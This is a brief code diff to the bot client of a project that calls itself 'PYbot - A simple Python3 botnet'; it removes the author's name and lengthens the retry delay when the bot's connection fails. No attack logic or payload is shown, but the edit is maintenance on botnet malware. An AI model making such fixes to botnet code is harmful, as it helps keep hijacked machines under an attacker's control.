@@ -1,5 +1,5 @@
 # PYbot - A simple Python3 botnet
-# Author: WodX
+# Author: 
 # Date: 
 # Bot
 
@@ -88,7 +88,7 @@ def main():
 
             break
         except:
-            time.sleep(2) # retry in 2 mins if connection fails
+            time.sleep(120) # retry in 2 mins if connection fails
 
     while 1:
         try:
